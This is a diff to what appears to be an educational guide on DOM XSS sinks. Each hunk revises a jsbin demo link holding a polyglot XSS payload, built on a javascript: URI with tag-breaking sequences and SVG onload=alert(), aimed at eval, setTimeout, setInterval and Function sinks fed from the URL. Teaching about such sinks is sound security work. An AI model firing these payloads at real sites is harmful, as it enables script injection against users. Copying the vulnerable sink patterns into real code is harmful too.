@@ -183,7 +183,7 @@ _Demo: <https://jsbin.com/vovogo>_
 eval(location.hash.slice(1));
 
 ````
-_Demo: [https://jsbin.com/qejisu#jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E](https://jsbin.com/qejisu#jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E)_
+_Demo: [https://jsbin.com/qejisu#jaVasCript:/\*-/\*%60/*%5C%60/\*'/*%22/\*\*/(/\*%20\*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e](https://jsbin.com/qejisu#jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e)_
 
 * __`setTimeout`:__
 ````javascript
@@ -191,7 +191,7 @@ _Demo: [https://jsbin.com/qejisu#jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/
 setTimeout(location.search.slice(1));
 
 ````
-_Demo: [https://jsbin.com/qawusa?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E](https://jsbin.com/qawusa?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E)_
+_Demo: [https://jsbin.com/qawusa?jaVasCript:/\*-/\*%60/\*%5C%60/\*'/\*%22/\*\*/(/\*%20\*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e](https://jsbin.com/qawusa?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e)_
 
 * __`setInterval`:__
 ````javascript
@@ -199,7 +199,7 @@ _Demo: [https://jsbin.com/qawusa?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/
 setInterval(location.search.slice(1));
 
 ````
-_Demo: [https://jsbin.com/colese?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E](https://jsbin.com/colese?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E)_
+_Demo: [https://jsbin.com/colese?jaVasCript:/\*-/\*%60/\*%5C%60/\*'/\*%22/\*\*/(/\*%20\*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e](https://jsbin.com/colese?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e)_
 
 * __`Function`:__
 ````javascript
@@ -207,7 +207,7 @@ _Demo: [https://jsbin.com/colese?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/
 new Function(location.search.slice(1))();
 
 ````
-_Demo: [https://jsbin.com/hizemi?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E](https://jsbin.com/hizemi?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E)_
+_Demo: [https://jsbin.com/hizemi?jaVasCript:/\*-/\*%60/\*%5C%60/\*'/\*%22/\*\*/(/\*%20\*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e](https://jsbin.com/hizemi?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e)_
 
 * __`innerHTML`/`outerHTML` and `document.write` with HTML-escaped strings:__
 ```javascript
